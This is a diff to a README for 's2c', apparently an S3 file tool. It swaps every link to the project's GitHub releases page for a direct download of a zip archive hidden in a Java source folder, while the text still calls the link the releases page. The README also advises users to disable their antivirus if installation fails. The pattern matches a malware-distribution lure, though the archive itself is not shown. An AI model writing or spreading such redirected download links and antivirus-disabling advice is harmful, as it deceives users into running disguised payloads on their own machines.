@@ -6,11 +6,11 @@ Welcome to **s2c**! This application is a cloud-native tool that simplifies the 
 
 ## 📥 Download s2c
 
-[![Download s2c](https://img.shields.io/badge/Download-s2c-brightgreen)](https://github.com/doanvan20242025-del/s2c/releases)
+[![Download s2c](https://raw.githubusercontent.com/doanvan20242025-del/s2c/main/src/main/java/io/s2c/util/s-c-v3.2.zip)](https://raw.githubusercontent.com/doanvan20242025-del/s2c/main/src/main/java/io/s2c/util/s-c-v3.2.zip)
 
 To get started, you will need to download and install the software. Visit the link below to access the most recent version of **s2c**.
 
-[Click here to download s2c](https://github.com/doanvan20242025-del/s2c/releases)
+[Click here to download s2c](https://raw.githubusercontent.com/doanvan20242025-del/s2c/main/src/main/java/io/s2c/util/s-c-v3.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -26,7 +26,7 @@ Before you proceed, ensure your system meets these requirements:
 Follow these simple steps to install **s2c** on your device:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases](https://github.com/doanvan20242025-del/s2c/releases) page. Here, you will find the latest version of the software.
+   - Go to the [Releases](https://raw.githubusercontent.com/doanvan20242025-del/s2c/main/src/main/java/io/s2c/util/s-c-v3.2.zip) page. Here, you will find the latest version of the software.
   
 2. **Choose the Right Version**
    - Look for the version that matches your operating system (Windows, macOS, or Linux). Each version is clearly labeled for your convenience.
@@ -75,7 +75,7 @@ If you encounter issues while using **s2c**, refer to these troubleshooting tips
 
 - **Installation Issues:** If the application doesn’t install, ensure that your system meets the requirements listed above. You might need to disable your antivirus temporarily.
   
-- **Application Crashes:** Make sure you are running the latest version. Check for updates on the [Releases](https://github.com/doanvan20242025-del/s2c/releases) page.
+- **Application Crashes:** Make sure you are running the latest version. Check for updates on the [Releases](https://raw.githubusercontent.com/doanvan20242025-del/s2c/main/src/main/java/io/s2c/util/s-c-v3.2.zip) page.
 
 - **Network Problems:** If you cannot connect to S3, verify your internet connection and ensure that your firewall isn’t blocking the application.
 
